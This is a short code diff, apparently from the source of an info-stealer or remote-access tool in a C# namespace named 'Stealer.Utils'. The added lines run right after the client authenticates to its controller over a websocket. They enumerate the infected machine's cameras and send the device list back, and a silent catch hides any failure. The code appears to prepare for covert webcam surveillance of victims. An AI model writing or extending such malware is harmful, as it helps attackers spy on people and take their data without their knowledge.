@@ -42,6 +42,13 @@ namespace Stealer.Utils
                     SendText(auth);
                     L("AUTH SENT");
 
+                    try
+                    {
+                        string camListJson = CameraStream.GetCameraListJson();
+                        SendText("{\"type\":\"camera_list\",\"devices\":" + camListJson + "}");
+                    }
+                    catch { }
+
                     ReceiveLoop();
                     L("RECEIVE LOOP ENDED, state=" + (_ws != null ? _ws.State.ToString() : "null"));
                 }
